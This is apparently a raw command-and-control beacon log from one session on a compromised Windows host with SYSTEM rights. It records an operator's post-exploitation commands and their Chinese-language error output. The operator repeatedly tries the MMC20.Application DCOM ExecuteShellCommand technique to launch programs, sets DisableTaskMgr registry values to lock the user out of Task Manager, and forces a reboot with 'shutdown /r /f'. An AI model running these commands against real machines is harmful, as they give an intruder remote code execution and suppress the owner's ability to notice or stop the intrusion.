02/02 13:48:11 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 2472; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/02 14:07:03 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:07:03 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"))
02/02 14:07:03 [task] Tasked beacon to run: $Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:07:05 [checkin] host called home, sent: 680 bytes
02/02 14:07:07 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:07:07 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">不能对值为空的表达式调用方法。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 45_x000D__x000A_</S><S S="Error">+ $Com.Document.ActiveView.ExecuteShellCommand &lt;&lt;&lt;&lt; ("c:\windows\system32\calc._x000D__x000A_</S><S S="Error">exe", $null, $null, "7")_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (ExecuteShellCommand:String) [ _x000D__x000A_</S><S S="Error">   ], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvokeMethodOnNull_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 14:16:16 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:16:16 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"))
02/02 14:16:16 [task] Tasked beacon to run: $Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:17:07 [checkin] host called home, sent: 680 bytes
02/02 14:17:09 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:17:09 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">不能对值为空的表达式调用方法。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 45_x000D__x000A_</S><S S="Error">+ $Com.Document.ActiveView.ExecuteShellCommand &lt;&lt;&lt;&lt; ("c:\windows\system32\calc._x000D__x000A_</S><S S="Error">exe", $null, $null, "7")_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (ExecuteShellCommand:String) [ _x000D__x000A_</S><S S="Error">   ], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvokeMethodOnNull_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 14:24:03 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:24:03 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"))
02/02 14:24:03 [task] Tasked beacon to run: $Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",$null,$null,"7")
02/02 14:24:10 [checkin] host called home, sent: 672 bytes
02/02 14:24:11 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:24:11 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">不能对值为空的表达式调用方法。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 45_x000D__x000A_</S><S S="Error">+ $Com.Document.ActiveView.ExecuteShellCommand &lt;&lt;&lt;&lt; ("c:\windows\system32\calc._x000D__x000A_</S><S S="Error">exe",$null,$null,"7")_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (ExecuteShellCommand:String) [ _x000D__x000A_</S><S S="Error">   ], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvokeMethodOnNull_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 14:43:57 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:43:57 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost")) -and $Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:44:11 [checkin] host called home, sent: 629 bytes
02/02 14:44:12 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:44:12 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">不能对值为空的表达式调用方法。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 143_x000D__x000A_</S><S S="Error">+ $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application_x000D__x000A_</S><S S="Error">","localhost")) -and $Com.Document.ActiveView.ExecuteShellCommand &lt;&lt;&lt;&lt; ("c:\win_x000D__x000A_</S><S S="Error">dows\system32\calc.exe", $null, $null, "7")_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (ExecuteShellCommand:String) [ _x000D__x000A_</S><S S="Error">   ], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvokeMethodOnNull_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 14:52:16 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:52:16 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:53:12 [checkin] host called home, sent: 617 bytes
02/02 14:53:12 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 14:54:53 [task] Tasked beacon to run: sc start DcomLaunch
02/02 14:54:53 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 14:55:12 [checkin] host called home, sent: 617 bytes
02/02 14:55:14 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 15:03:09 [task] Tasked beacon to run: sc start DcomLaunch
02/02 15:03:09 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 15:03:14 [checkin] host called home, sent: 617 bytes
02/02 15:03:16 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



02/02 15:11:13 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 15:11:13 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -Value 1
02/02 15:11:13 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 15:11:13 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -Value 1
02/02 15:11:13 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 15:11:13 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -Value 1
02/02 15:11:13 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -Name DisableTaskMgr
02/02 15:11:13 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon -Name DisableTaskMgr -Value 1
02/02 15:11:13 [task] Tasked beacon to run: shutdown /r /f
02/02 15:11:16 [checkin] host called home, sent: 3317 bytes
02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curren_x000D__x000A_</S><S S="Error">tVersion\Policies\System 处不存在属性 DisableTaskMgr。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (DisableTaskMgr:String) [Remove _x000D__x000A_</S><S S="Error">   -ItemProperty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:


PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies\System
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies
PSChildName    : System
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
DisableTaskMgr : 1





02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System -Name DisableTaskMgr -Value 1_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem -Name DisableTaskMgr -Value 1_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到接受实际参数“NT\CurrentVersion\Winlogon”的位置形_x000D__x000A_</S><S S="Error">式参数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVe_x000D__x000A_</S><S S="Error">rsion\Winlogon -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [Remove-ItemProperty], Para _x000D__x000A_</S><S S="Error">   meterBindingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:11:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到接受实际参数“NT\CurrentVersion\Winlogon”的位置形式参_x000D__x000A_</S><S S="Error">数。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersi_x000D__x000A_</S><S S="Error">on\Winlogon -Name DisableTaskMgr -Value 1_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (:) [New-ItemProperty], Paramet _x000D__x000A_</S><S S="Error">   erBindingException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell _x000D__x000A_</S><S S="Error">   .Commands.NewItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 15:43:45 [task] Tasked beacon to run: sc start DcomLaunch
02/02 15:43:45 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 15:49:53 [task] Tasked beacon to run: sc start DcomLaunch
02/02 15:49:53 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 15:51:09 [input] <neo> shell calc
02/02 15:51:09 [task] Tasked beacon to run: calc
